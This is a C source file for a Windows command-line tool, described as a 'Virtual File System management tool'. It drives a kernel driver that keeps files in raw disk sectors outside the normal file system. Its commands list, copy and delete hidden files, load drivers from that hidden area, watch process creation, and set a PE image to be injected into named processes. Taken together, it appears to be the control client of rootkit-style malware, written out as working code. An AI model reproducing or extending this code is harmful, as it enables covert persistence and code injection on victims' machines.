//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Vitual File System management tool
//	
// module: names.c
// $Revision: 64 $
// $Date: 2012-05-21 23:40:16 +0400 (Пн, 21 май 2012) $
// description:
//  Sample Virtual File System management tool.

#include <conio.h>
#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <psapi.h>
#include "..\fslib\fslib.h"



#define		WINERROR				ULONG	// WIN32 error code
#define		ERROR_UNSUCCESSFULL		(WINERROR)-1

#define		PAGE_SIZE				0x1000	// bytes


#define		tczMaskAny		_T("*.*")
#define		tczVfs			_T("vfs\\")


#define		tczDir		_T("DIR")
#define		tczCopy		_T("COPY")
#define		tczDel		_T("DEL")
#define		tczLoad		_T("LOAD")
#define		tczWatch	_T("WATCH")
#define		tczInject	_T("INJECT")


// Constant string length
#define		cstrlenA(x)		(sizeof(x)-1)
#define		cstrlenW(x)		((sizeof(x) / sizeof(WCHAR)) - 1)

#if _UNICODE
	#define	cstrlen(x)	cstrlenW(x)
#else
	#define	cstrlen(x)	cstrlenA(x)
#endif

HANDLE		g_VfsHandle	= 0;
LPTSTR		g_VfsRootName = NULL;


#pragma warning(disable:4996)	// 'wcscpy': This function or variable may be unsafe. 


// Predefinitions
LPTSTR	CreateFsDeviceName(VOID);
BOOL	GetProcessImagePath(HANDLE	ProcessId, PWCHAR pImagePath, ULONG	PathLength);



BOOL IsFsPresent(VOID)
{
	BOOL	Ret = FALSE;
	HANDLE	hFile;

	hFile = CreateFile(g_VfsRootName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,  NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_DIRECTORY, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		Ret = TRUE;
	}
	return(Ret);
}


VOID PrintUsage(BOOL FsPresent)
{
	printf("Virtual File System management tool. Version 1.2. %s\n", __TIMESTAMP__);
	printf("VFS root path: %S\n", g_VfsRootName);

	if (FsPresent)
		printf("VFS driver detected.\n");
	else
		printf("VFS driver not found.\n");

}

//
// Converst "vfs\"-based path into "Device\" - based path
//
LPTSTR	PathToDevice(LPTSTR	FilePath)
{
	ULONG	PathLen = (ULONG)_tcslen(FilePath);
	LPTSTR	DevicePath = NULL;
	LONG	NotVfs;

	// Check if the specified path contains "vfs\" prefix
	if (PathLen >= cstrlen(tczVfs))
	{
		_TCHAR	z = FilePath[cstrlen(tczVfs)];
		FilePath[cstrlen(tczVfs)] = 0;

		NotVfs = _tcsicmp(FilePath, tczVfs);
		FilePath[cstrlen(tczVfs)] = z;

		if (!NotVfs)
		{
			// Replace "vfs\" prefix with "Device\XXX" prefix
			if (DevicePath = malloc((PathLen - cstrlen(tczVfs) + _tcslen(g_VfsRootName) + 1) * sizeof(_TCHAR)))
			{
				_tcscpy(DevicePath, g_VfsRootName);
				_tcscat(DevicePath, (LPTSTR)&FilePath[cstrlen(tczVfs)]);
			}	// if (DevicePath = malloc(
		}	// if (_tcsicmp(FilePath, tczVfs) == 0)
	}	// if (PathLen >= cstrlen(tczVfat))
	return(DevicePath);
}


//
// List the specified directory the same way as "DIR" command does.
//
WINERROR CmdDir(
			LPTSTR	Directory,		// Path to the directory to list
			LPTSTR Mask				// File mask to display
			)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	HANDLE		hFind;
	LPTSTR		FindPath;
	SYSTEMTIME	SysTime;
	WIN32_FIND_DATA	FindData = {0};
	ULONG		nFiles = 0, nBytes = 0;

	if (FindPath = malloc((_tcslen(Directory) + _tcslen(Mask) + 1) * sizeof(_TCHAR)))
	{
		_tcscpy(FindPath, Directory);
		_tcscat(FindPath, Mask);

		hFind = FindFirstFile(FindPath, &FindData);

		printf(" Directory of %S\n\n", Directory);
		if (hFind != INVALID_HANDLE_VALUE)
		{
			do 
			{
				FileTimeToSystemTime(&FindData.ftCreationTime, &SysTime);

				printf("%02u.%02u.%04u  %02u:%02u % 16u %S\n", SysTime.wDay, SysTime.wMonth, SysTime.wYear, SysTime.wHour, SysTime.wMinute, FindData.nFileSizeLow, FindData.cFileName);
				nFiles += 1;
				nBytes += FindData.nFileSizeLow;
			}while(FindNextFile(hFind, &FindData));

			FindClose(hFind);
		}	// if (hFind = FindFirstFile(FindPath, &FindData))
		printf("% 16u File(s) % 16u Bytes\n", nFiles, nBytes);

		free(FindPath);
	}	// if (FindPath = malloc((lstrlen(Directory) + lstrlen(Mask) + 1) * sizeof(_TCHAR)))

	return(Status);
}

//
//	Copies Source file into the Dest file. If the Dest file exists it's being overwrited.
//
WINERROR	CmdCopy(LPTSTR	Source, LPTSTR Dest)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	HANDLE		hSource = 0, hDest = 0;
	LPTSTR		SourcePath, DestPath, SourceDevice = NULL, DestDevice = NULL;
	ULONG		bRead, FileSize, NameLen, nFiles = 0;
	PCHAR		Buffer;


	if (!(SourcePath = SourceDevice = PathToDevice(Source)))
		SourcePath = Source;

	if (!(DestPath = DestDevice = PathToDevice(Dest)))
		DestPath = Dest;

	// Checking if destination file name not specified
	NameLen = (ULONG)_tcslen(DestPath);
	if (DestPath[NameLen - 1] == '\\')
	{
		// Coping short name of the source file
		LPTSTR	NewPath, ShortName;
		if (!(ShortName = _tcsrchr(SourcePath, '\\')))
			ShortName = SourcePath;

		if (NewPath = malloc((NameLen + _tcslen(ShortName) + 1) * sizeof(_TCHAR)))
		{
			_tcscpy(NewPath, DestPath);
			_tcscat(NewPath, ShortName);
			if (DestDevice)
				free(DestDevice);

			DestPath = DestDevice = NewPath;
		}	// if (NewPath = malloc((NameLen + _tcslen(ShortName) + 1) * sizeof(_TCHAR)))
	}	// if (DestPath[NameLen - 1] == '\\')


	do	// not a loop
	{
		hSource = CreateFile(SourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hSource == INVALID_HANDLE_VALUE)
		{
			printf("VFS cannot find the file specified.\n");
			break;
		}

		hDest = CreateFile(DestPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
		if (hDest == INVALID_HANDLE_VALUE)
		{
			printf("Access is denied.\n");
			break;
		}


		if (FileSize = GetFileSize(hSource, NULL))
		{
			if (!(Buffer = VirtualAlloc(NULL, FileSize, MEM_COMMIT, PAGE_READWRITE)))
			{
				break;
			}

			if (!ReadFile(hSource, Buffer, FileSize, &bRead, NULL))
			{
				printf("Error reading source file.\n");
				break;
			}

			if (!WriteFile(hDest, Buffer, FileSize, &bRead, NULL))
			{
				printf("Error writing target file.\n");
				break;
			}

			// Truncate destination file at the current position
			SetEndOfFile(hDest);

		}	// if (FileSize = GetFileSize(hSource, NULL))

		Status = NO_ERROR;
		nFiles = 1;
		
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	printf("% 8u file(s) copied.\n", nFiles);

	if (hSource)
		CloseHandle(hSource);

	if (hDest)
		CloseHandle(hDest);

	if (SourceDevice)
		free(SourceDevice);

	if (DestDevice)
		free(DestDevice);

	return(Status);
}

//
// Deletes the specified file.
//
WINERROR	CmdDel(LPTSTR	FileName)
{
	LPTSTR		FilePath, DevicePath = 0;
	WINERROR	Status = NO_ERROR;

	if (!(FilePath = DevicePath = PathToDevice(FileName)))
		FilePath = FileName;

	if (!DeleteFile(FilePath))
	{
		Status = GetLastError();
		printf("VFS cannot find the file specified.\n");
	}

	if (DevicePath)
		free(DevicePath);

	return(Status);
}

//
//	Loads the specified driver.
//
WINERROR	CmdLoad(LPTSTR	FileName)
{
	LPTSTR		FilePath, DevicePath = 0;
	WINERROR	Status = NO_ERROR;
	PWCHAR		wFilePath = NULL;
	HANDLE		hDevice;

	if (!(FilePath = DevicePath = PathToDevice(FileName)))
		FilePath = FileName;

#if _UNICODE
	wFilePath = FilePath;
#else
	if (wFilePath = malloc((_tcslen(FilePath) + 1) * sizeof(WCHAR)))
		mbstowcs(wFilePath, FilePath, (_tcslen(FilePath) + 1));
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;
#endif

	if (wFilePath)
	{
		ULONG bRead;

		hDevice = CreateFile(g_VfsRootName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
		if (hDevice != INVALID_HANDLE_VALUE)
		{
			if (!DeviceIoControl(hDevice, IOCTL_VFS_LOAD_DRIVER, wFilePath, (ULONG)(wcslen(wFilePath) + 1) * sizeof(WCHAR), NULL, 0, &bRead, NULL))
				Status = GetLastError();

			CloseHandle(hDevice);
		}
		else
			Status = GetLastError();

#if !(_UNICODE)
		free(wFilePath);
#endif
	}

	if (DevicePath)
		free(DevicePath);

	if (Status == NO_ERROR)
		printf("Specified driver successfully loaded.\n");
	else
	{
		printf("Driver loading failed with error %u\n", Status); 
	}

	return(Status);
}


//
//	Sets the inject for the specified module.
//
WINERROR	CmdInject(
	LPTSTR	FileName,
	LPTSTR	ProcessList
	)
{
	LPTSTR		ShortName, FilePath, DevicePath = 0;
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	HANDLE		hDevice, hFile;
	ULONG		bRead, FileSize;
	PVFS_INJECT_INFO pInjectInfo = NULL;

	if (!(FilePath = DevicePath = PathToDevice(FileName)))
		FilePath = FileName;

	do	// not a loop
	{
		hFile = CreateFile(FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf("File not found: %S\n", FileName);
			break;
		}

		if (!(FileSize = GetFileSize(hFile, NULL)))
		{
			printf("Invalid image file: %S\n", FileName);
			Status = ERROR_BAD_EXE_FORMAT;
			break;
		}
			
		if (!(pInjectInfo = malloc(sizeof(VFS_INJECT_INFO) + FileSize)))
			break;

		memset(pInjectInfo, 0, sizeof(VFS_INJECT_INFO));

		if (!ReadFile(hFile, &pInjectInfo->PeFile, FileSize, &bRead, NULL))
			break;

		if (ShortName = _tcsrchr(FileName, '\\'))
			ShortName += 1;
		else
			ShortName = FileName;

		// Checking if file name length matches the VFS length requirements
		if ((bRead = (ULONG)_tcslen(ShortName)) > VFS_FILE_NAME_LENGTH)
			// Cutting the file name to match the VFS length requirements
			ShortName += (bRead - VFS_FILE_NAME_LENGTH);

#if (_UNICODE)
		wcstombs((PCHAR)&pInjectInfo->InjectName, ShortName, VFS_FILE_NAME_LENGTH);
		wcstombs((PCHAR)&pInjectInfo->ProcessList, ProcessList, VFS_PROCESS_LIST_LENGTH);
#else
		memcpy(&pInjectInfo->InjectName, ShortName, VFS_FILE_NAME_LENGTH);
		memcpy(&pInjectInfo->ProcessList, ProcessList, min(_tcslen(ProcessList) + 1, VFS_PROCESS_LIST_LENGTH));
#endif

		hDevice = CreateFile(g_VfsRootName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
		if (hDevice == INVALID_HANDLE_VALUE)
			break;

		if (DeviceIoControl(hDevice, IOCTL_VFS_SET_INJECT, pInjectInfo, sizeof(VFS_INJECT_INFO) + FileSize, NULL, 0, &bRead, NULL))
			Status = NO_ERROR;

		CloseHandle(hDevice);
	} while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	if (DevicePath)
		free(DevicePath);

	if (pInjectInfo)
		free(pInjectInfo);

	if (Status == NO_ERROR)
	{
		if (ProcessList[0])
			printf("Inject successfully set.\n");
		else
			printf("Inject successfully removed.\n");
	}
	else
		printf("Setting inject failed with error %u\n", Status); 

	return(Status);
}


//
//	Process create callback routine.
//	Called as user-mode APC queued by the VFS driver whenever any process is being created.
//	Receives USER_CALLBACK_CONTEXT, containing the new process' and it's parent's IDs.
//	After finished it's processing this functon MUST do the following:
//	 - set Context->hEvent;
//	 - close Context->hEvent handle;
//
VOID _stdcall MyCreateProcessCallback(
	PUSER_CALLBACK_CONTEXT	Context,
	PVOID	SystemArgument1,
	PVOID	SystemArgument2
	)
{	
	_TCHAR	ProcessPath[MAX_PATH];
	// Copying Context->hEvent handle into the variable, since Context structure will be unaccessable
	//  right after setting this event.
	HANDLE	hEvent = Context->hEvent;

	if (GetProcessImagePath(Context->ProcessId, (LPTSTR)&ProcessPath, MAX_PATH))
	{
		printf("%S", (LPTSTR)ProcessPath);
		if (GetProcessImagePath(Context->ParentId, (LPTSTR)&ProcessPath, MAX_PATH))
		{
			LPTSTR	pName = _tcsrchr((LPTSTR)ProcessPath, '\\');
			if (!pName)
				pName = (LPTSTR)&ProcessPath;
			else
				pName += 1;

			printf(" by %S", pName);
		}
		printf("\n");
	}	// if (GetProcessPathById(Context->ProcessId, (LPTSTR)&ProcessPath, MAX_PATH))

	// Setting callback notification event and closing it's handle
	SetEvent(hEvent);
	CloseHandle(hEvent);
}


//
//	Returns TRU if a key was pressed.
//
BOOL IsKeyPressed(VOID)
{
	BOOL	Ret = FALSE;
	ULONG	nEvents = 0;
	HANDLE	hStdInput = GetStdHandle(STD_INPUT_HANDLE);

	if (GetNumberOfConsoleInputEvents(hStdInput, &nEvents) && nEvents)
	{
		PINPUT_RECORD	pBuffer, pInput;
		ULONG			Records;

		if (pBuffer = malloc(sizeof(INPUT_RECORD) * 16))
		{
			pInput = pBuffer;
			if (ReadConsoleInput(hStdInput, pInput, 16, &Records))
			{
				do
				{
					if (pInput->EventType == KEY_EVENT)
					{
						Ret = TRUE;
						break;
					}
					pInput += 1;
				} while(Records -= 1);
			}	// if (ReadConsoleInput(hStdInput, pInput, 16, &Records))
			free(pBuffer);
		}	// if (pInput = malloc(sizeof(INPUT_RECORD) * 16))
	}	// if (GetNumberOfConsoleInputEvents(hStdInput, &nEvents) && nEvents)

	return(Ret);
}


//
//	Registers process startup callback and enumerates all started processes.
//
WINERROR	CmdWatch(VOID)
{
	HANDLE		hDevice = INVALID_HANDLE_VALUE;
	WINERROR	Status = NO_ERROR;
	ULONG		bRead;
	VFS_CALLBACK_INFO	CallbackInfo = {0};

	CallbackInfo.pCallbackFunction = &MyCreateProcessCallback;
	CallbackInfo.Context = NULL;
	CallbackInfo.bSet = TRUE;

	hDevice = CreateFile(g_VfsRootName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
	if (hDevice != INVALID_HANDLE_VALUE)
	{
		// Settig our create process notification callback
		if (DeviceIoControl(hDevice, IOCTL_VFS_SET_CALLBACK, &CallbackInfo, sizeof(VFS_CALLBACK_INFO), NULL, 0, &bRead, NULL))
		{
			printf("Waiting for process startup events. Press any key to stop...\n");
			do 
			{
				// Waiting for a key pressed in a loop
				// The thread must be in alertable state to process APCs
				SleepEx(200, TRUE);
			} while(!IsKeyPressed());

			// Removing the create process notification callback
			CallbackInfo.bSet = FALSE;
			DeviceIoControl(hDevice, IOCTL_VFS_SET_CALLBACK, &CallbackInfo, sizeof(VFS_CALLBACK_INFO), NULL, 0, &bRead, NULL);
		}	// if (DeviceIoControl(hDevice,...
		else
			Status = GetLastError();

		CloseHandle(hDevice);
	}	// if (hDevice != INVALID_HANDLE_VALUE)
	else
		Status = GetLastError();

	return(Status);
}
//
//	Dumps FS information
//
WINERROR	GetFsInfo(VOID)
{
	PVFS_INFORMATION	FsInfo = NULL;
	HANDLE		hDevice = INVALID_HANDLE_VALUE;
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	ULONG		bRead;

	do	// not a loop
	{
		if (!(FsInfo = malloc(PAGE_SIZE)))
			break;
		
		hDevice = CreateFile(g_VfsRootName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
		if (hDevice == INVALID_HANDLE_VALUE)
			break;
		
		if (!(DeviceIoControl(hDevice, IOCTL_VFS_QUERY_INFO, NULL, 0, FsInfo, PAGE_SIZE, &bRead, NULL)))
			break;

		printf("\nDisk device name: %S\n", (PWCHAR)&FsInfo->DeviceName);
		printf("FS area start sector: %u\n", FsInfo->StartSector);
		printf("Number of FS sectors: %u\n", FsInfo->NumberOfSectors);
		printf("Size of FS area (bytes): %u\n", FsInfo->VolumeSize);
		printf("Size of volume (bytes): %u\n", FsInfo->BytesTotal);

		Status = NO_ERROR;

	} while(FALSE);	

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (FsInfo)
		free(FsInfo);

	if (hDevice != INVALID_HANDLE_VALUE)
		CloseHandle(hDevice);

	return(Status);
}


int _tmain(int argc, _TCHAR* argv[])
{
	ULONG	Status = ERROR_INVALID_PARAMETER;
	BOOL	FsPresent = FALSE;

	if (g_VfsRootName = CreateFsDeviceName())
		FsPresent = IsFsPresent();

	if (argc > 1 && FsPresent)
	{
		// Checking command line parameters
		do // not a loop
		{

			// DIR command
			if (_tcsicmp(argv[1], tczDir) == 0)
			{
				LPTSTR	Mask = tczMaskAny;
				if (argc > 2)
					Mask = argv[2];

				Status = CmdDir(g_VfsRootName, Mask);
				break;
			}

			// DEL command
			if (_tcsicmp(argv[1], tczDel) == 0)
			{
				if (argc > 2)
					Status = CmdDel(argv[2]);
				
				break;
			}

			// COPY command
			if (_tcsicmp(argv[1], tczCopy) == 0)
			{
				if (argc == 4)
					Status = CmdCopy(argv[2], argv[3]);

				break;
			}

			// LOAD command
			if (_tcsicmp(argv[1], tczLoad) == 0)
			{
				if (argc > 2)
					Status = CmdLoad(argv[2]);
				
				break;
			}

			// WATCH command
			if (_tcsicmp(argv[1], tczWatch) == 0)
			{
				Status = CmdWatch();
				break;
			}

			// INJECT command
			if (_tcsicmp(argv[1], tczInject) == 0)
			{
				if (argc > 2)
				{
					LONG i, Len = 0;
					LPTSTR	Params;

					// Calculating total length of all parameters
					for (i=0; i<(argc - 3); i++)
						Len += (LONG)_tcslen(argv[i + 3]) + 1;

					// Allocating buffer for parameters line
					if (Params = malloc((Len + 1) * sizeof(_TCHAR)))
					{
						// Creating parametrs line
						Params[0] = 0;
						for (i=0; i<(argc - 3); i++)
							_tcscat(Params, argv[i + 3]);

						Status = CmdInject(argv[2], Params);
						free(Params);
					}
					else
						Status = ERROR_NOT_ENOUGH_MEMORY;
				}
				
				break;
			}
		} while(FALSE);
	}	// if (argc > 1 && FsPresent)
	else
	{
		PrintUsage(FsPresent);
		GetFsInfo();
	}

	return(Status);
}

